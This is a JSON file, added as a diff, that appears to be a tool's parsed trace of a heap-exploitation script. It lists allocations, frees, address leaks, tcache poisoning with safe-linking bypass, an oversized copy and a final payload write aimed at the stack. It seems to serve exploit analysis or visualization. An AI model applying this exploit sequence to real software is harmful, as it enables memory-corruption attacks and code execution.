@@ -1,0 +1,997 @@
+{
+  "operations": [
+    {
+      "op_id": "op_001",
+      "kind": "alloc",
+      "chunk": "A",
+      "index": "0",
+      "request_size": "0x100",
+      "data": "0",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,i) [i=0]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_002",
+      "kind": "alloc",
+      "chunk": "B",
+      "index": "1",
+      "request_size": "0x100",
+      "data": "1",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,i) [i=1]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_003",
+      "kind": "alloc",
+      "chunk": "C",
+      "index": "2",
+      "request_size": "0x100",
+      "data": "2",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,i) [i=2]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_004",
+      "kind": "alloc",
+      "chunk": "D",
+      "index": "3",
+      "request_size": "0x100",
+      "data": "3",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,i) [i=3]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_005",
+      "kind": "alloc",
+      "chunk": "E",
+      "index": "4",
+      "request_size": "0x100",
+      "data": "4",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,i) [i=4]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_006",
+      "kind": "alloc",
+      "chunk": "F",
+      "index": "5",
+      "request_size": "0x100",
+      "data": "5",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,i) [i=5]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_007",
+      "kind": "alloc",
+      "chunk": "G",
+      "index": "6",
+      "request_size": "0x100",
+      "data": "6",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,i) [i=6]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_008",
+      "kind": "alloc",
+      "chunk": "H",
+      "index": "7",
+      "request_size": "0x100",
+      "data": "7",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,i) [i=7]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_009",
+      "kind": "free",
+      "chunk": "B",
+      "index": "1",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(i) [i=1]",
+      "meta": {}
+    },
+    {
+      "op_id": "op_010",
+      "kind": "free",
+      "chunk": "C",
+      "index": "2",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(i) [i=2]",
+      "meta": {}
+    },
+    {
+      "op_id": "op_011",
+      "kind": "free",
+      "chunk": "D",
+      "index": "3",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(i) [i=3]",
+      "meta": {}
+    },
+    {
+      "op_id": "op_012",
+      "kind": "free",
+      "chunk": "E",
+      "index": "4",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(i) [i=4]",
+      "meta": {}
+    },
+    {
+      "op_id": "op_013",
+      "kind": "free",
+      "chunk": "F",
+      "index": "5",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(i) [i=5]",
+      "meta": {}
+    },
+    {
+      "op_id": "op_014",
+      "kind": "free",
+      "chunk": "G",
+      "index": "6",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(i) [i=6]",
+      "meta": {}
+    },
+    {
+      "op_id": "op_015",
+      "kind": "free",
+      "chunk": "H",
+      "index": "7",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(i) [i=7]",
+      "meta": {}
+    },
+    {
+      "op_id": "op_016",
+      "kind": "free",
+      "chunk": "A",
+      "index": "0",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(0)",
+      "meta": {}
+    },
+    {
+      "op_id": "op_017",
+      "kind": "alloc",
+      "chunk": "I",
+      "index": "1",
+      "request_size": "0x100",
+      "data": "1",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100, i) [i=1]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_018",
+      "kind": "alloc",
+      "chunk": "J",
+      "index": "2",
+      "request_size": "0x100",
+      "data": "2",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100, i) [i=2]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_019",
+      "kind": "alloc",
+      "chunk": "K",
+      "index": "3",
+      "request_size": "0x100",
+      "data": "3",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100, i) [i=3]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_020",
+      "kind": "alloc",
+      "chunk": "L",
+      "index": "4",
+      "request_size": "0x100",
+      "data": "4",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100, i) [i=4]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_021",
+      "kind": "alloc",
+      "chunk": "M",
+      "index": "5",
+      "request_size": "0x100",
+      "data": "5",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100, i) [i=5]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_022",
+      "kind": "alloc",
+      "chunk": "N",
+      "index": "6",
+      "request_size": "0x100",
+      "data": "6",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100, i) [i=6]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_023",
+      "kind": "alloc",
+      "chunk": "O",
+      "index": "7",
+      "request_size": "0x100",
+      "data": "7",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100, i) [i=7]",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_024",
+      "kind": "alloc",
+      "chunk": "P",
+      "index": "0",
+      "request_size": "0x100",
+      "data": "0",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,0)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_025",
+      "kind": "show",
+      "chunk": "P",
+      "index": "0",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: show(0)",
+      "meta": {
+        "function": "show",
+        "expression": "show(0)",
+        "result_var": "data"
+      }
+    },
+    {
+      "op_id": "op_026",
+      "kind": "derive_value",
+      "chunk": "leak",
+      "index": "",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "u64(data[:6].ljust(8,b'\\x00'))",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: leak=u64(data[:6].ljust(8,b'\\x00'))",
+      "meta": {
+        "result_var": "leak",
+        "expression": "u64(data[:6].ljust(8,b'\\x00'))",
+        "dependencies": "data",
+        "source_kind": "derived",
+        "source": "leak=u64(data[:6].ljust(8,b'\\x00'))",
+        "provenance": "derived",
+        "byte_width": "8",
+        "endian": "little",
+        "observed_bytes": "6"
+      }
+    },
+    {
+      "op_id": "op_027",
+      "kind": "show",
+      "chunk": "O",
+      "index": "7",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: show(7)",
+      "meta": {
+        "function": "show",
+        "expression": "show(7)",
+        "result_var": "data"
+      }
+    },
+    {
+      "op_id": "op_028",
+      "kind": "derive_value",
+      "chunk": "heap",
+      "index": "",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "u64(data[:5].ljust(8,b'\\x00'))<<12",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: heap=u64(data[:5].ljust(8,b'\\x00'))<<12",
+      "meta": {
+        "result_var": "heap",
+        "expression": "u64(data[:5].ljust(8,b'\\x00'))<<12",
+        "dependencies": "data",
+        "source_kind": "derived",
+        "source": "heap=u64(data[:5].ljust(8,b'\\x00'))<<12",
+        "provenance": "derived",
+        "byte_width": "8",
+        "endian": "little",
+        "observed_bytes": "5"
+      }
+    },
+    {
+      "op_id": "op_029",
+      "kind": "alloc",
+      "chunk": "Q",
+      "index": "14",
+      "request_size": "0x380",
+      "data": "14",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x380,14)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_030",
+      "kind": "alloc",
+      "chunk": "R",
+      "index": "15",
+      "request_size": "0x380",
+      "data": "15",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x380,15)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_031",
+      "kind": "free",
+      "chunk": "",
+      "index": "0x80|14",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(0x80|14)",
+      "meta": {}
+    },
+    {
+      "op_id": "op_032",
+      "kind": "free",
+      "chunk": "Q",
+      "index": "14",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(14)",
+      "meta": {}
+    },
+    {
+      "op_id": "op_033",
+      "kind": "derive_value",
+      "chunk": "uaf_chunk",
+      "index": "",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "heap+0xf20",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: uaf_chunk=heap+0xf20",
+      "meta": {
+        "result_var": "uaf_chunk",
+        "expression": "heap+0xf20",
+        "dependencies": "heap",
+        "source_kind": "derived",
+        "source": "uaf_chunk=heap+0xf20",
+        "provenance": "derived"
+      }
+    },
+    {
+      "op_id": "op_034",
+      "kind": "show",
+      "chunk": "R",
+      "index": "15",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: show(15)",
+      "meta": {
+        "function": "show",
+        "expression": "show(15)",
+        "result_var": "old_fd_raw"
+      }
+    },
+    {
+      "op_id": "op_035",
+      "kind": "derive_value",
+      "chunk": "old_fd",
+      "index": "",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "u64(old_fd_raw[:8].ljust(8,b'\\x00'))",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: old_fd=u64(show(15)[:8].ljust(8,b'\\x00'))",
+      "meta": {
+        "result_var": "old_fd",
+        "expression": "u64(old_fd_raw[:8].ljust(8,b'\\x00'))",
+        "dependencies": "old_fd_raw",
+        "source_kind": "derived",
+        "source": "old_fd=u64(show(15)[:8].ljust(8,b'\\x00'))",
+        "provenance": "derived",
+        "byte_width": "8",
+        "endian": "little",
+        "observed_bytes": "8"
+      }
+    },
+    {
+      "op_id": "op_036",
+      "kind": "edit",
+      "chunk": "R",
+      "index": "15",
+      "request_size": "",
+      "data": "p64(target ^ (uaf_chunk>>12))",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: edit(15,p64(target ^ (uaf_chunk>>12)))",
+      "meta": {}
+    },
+    {
+      "op_id": "op_037",
+      "kind": "alloc",
+      "chunk": "S",
+      "index": "14",
+      "request_size": "0x380",
+      "data": "14",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x380,14)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_038",
+      "kind": "alloc",
+      "chunk": "T",
+      "index": "13",
+      "request_size": "0x380",
+      "data": "13",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x380,13)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_039",
+      "kind": "edit",
+      "chunk": "I",
+      "index": "1",
+      "request_size": "",
+      "data": "b'A'*0x30",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: edit(1,b'A'*0x30)",
+      "meta": {}
+    },
+    {
+      "op_id": "op_040",
+      "kind": "copy",
+      "chunk": "T",
+      "index": "13",
+      "request_size": "0x18",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "I",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: copy(1,13,0x18)",
+      "meta": {
+        "src": "1",
+        "dst": "13",
+        "length": "0x18",
+        "src_chunk": "I",
+        "dst_chunk": "T"
+      }
+    },
+    {
+      "op_id": "op_041",
+      "kind": "show",
+      "chunk": "T",
+      "index": "13",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: show(13)",
+      "meta": {
+        "function": "show",
+        "expression": "show(13)",
+        "result_var": "data"
+      }
+    },
+    {
+      "op_id": "op_042",
+      "kind": "derive_value",
+      "chunk": "stack",
+      "index": "",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "u64(data[0x18:0x18+6].ljust(8,b'\\x00'))",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: stack=u64(data[0x18:0x18+6].ljust(8,b'\\x00'))",
+      "meta": {
+        "result_var": "stack",
+        "expression": "u64(data[0x18:0x18+6].ljust(8,b'\\x00'))",
+        "dependencies": "data",
+        "source_kind": "derived",
+        "source": "stack=u64(data[0x18:0x18+6].ljust(8,b'\\x00'))",
+        "provenance": "derived",
+        "byte_width": "8",
+        "endian": "little"
+      }
+    },
+    {
+      "op_id": "op_043",
+      "kind": "derive_value",
+      "chunk": "stack_target",
+      "index": "",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "stack-0x148",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: stack_target=stack-0x148",
+      "meta": {
+        "result_var": "stack_target",
+        "expression": "stack-0x148",
+        "dependencies": "stack",
+        "source_kind": "derived",
+        "source": "stack_target=stack-0x148",
+        "provenance": "derived"
+      }
+    },
+    {
+      "op_id": "op_044",
+      "kind": "alloc",
+      "chunk": "U",
+      "index": "8",
+      "request_size": "0xc0",
+      "data": "8",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0xc0,8)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_045",
+      "kind": "alloc",
+      "chunk": "V",
+      "index": "9",
+      "request_size": "0xa0",
+      "data": "9",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0xa0,9)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_046",
+      "kind": "alloc",
+      "chunk": "W",
+      "index": "10",
+      "request_size": "0x100",
+      "data": "10",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,10)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_047",
+      "kind": "alloc",
+      "chunk": "X",
+      "index": "11",
+      "request_size": "0x100",
+      "data": "11",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0x100,11)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_048",
+      "kind": "alloc",
+      "chunk": "Y",
+      "index": "12",
+      "request_size": "0xa0",
+      "data": "12",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0xa0,12)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_049",
+      "kind": "derive_value",
+      "chunk": "victim",
+      "index": "",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "uaf_chunk+0x460",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: victim=uaf_chunk+0x460",
+      "meta": {
+        "result_var": "victim",
+        "expression": "uaf_chunk+0x460",
+        "dependencies": "uaf_chunk",
+        "source_kind": "derived",
+        "source": "victim=uaf_chunk+0x460",
+        "provenance": "derived"
+      }
+    },
+    {
+      "op_id": "op_050",
+      "kind": "edit",
+      "chunk": "W",
+      "index": "10",
+      "request_size": "",
+      "data": "b'B'*0x60+p64(stack_target ^ (victim>>12))",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: edit(10,b'B'*0x60+p64(stack_target ^ (victim>>12)))",
+      "meta": {}
+    },
+    {
+      "op_id": "op_051",
+      "kind": "free",
+      "chunk": "Y",
+      "index": "12",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(12)",
+      "meta": {}
+    },
+    {
+      "op_id": "op_052",
+      "kind": "free",
+      "chunk": "V",
+      "index": "9",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: delete(9)",
+      "meta": {}
+    },
+    {
+      "op_id": "op_053",
+      "kind": "copy",
+      "chunk": "W",
+      "index": "10",
+      "request_size": "0xfffffff0",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "X",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: copy(11,10,0xfffffff0)",
+      "meta": {
+        "src": "11",
+        "dst": "10",
+        "length": "0xfffffff0",
+        "src_chunk": "X",
+        "dst_chunk": "W"
+      }
+    },
+    {
+      "op_id": "op_054",
+      "kind": "alloc",
+      "chunk": "Z",
+      "index": "9",
+      "request_size": "0xa0",
+      "data": "9",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0xa0,9)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_055",
+      "kind": "alloc",
+      "chunk": "AA",
+      "index": "12",
+      "request_size": "0xa0",
+      "data": "12",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: add(0xa0,12)",
+      "meta": {
+        "parse_confidence": "confirmed"
+      }
+    },
+    {
+      "op_id": "op_056",
+      "kind": "edit",
+      "chunk": "AA",
+      "index": "12",
+      "request_size": "",
+      "data": "payload",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: edit(12,payload)",
+      "meta": {}
+    }
+  ],
+  "diagnostics": [
+    {
+      "severity": "info",
+      "code": "unsupported_statement",
+      "message": "暂未识别语句 Assert。",
+      "start": 1865,
+      "end": 1919,
+      "line": 73,
+      "suggestion": ""
+    }
+  ]
+}
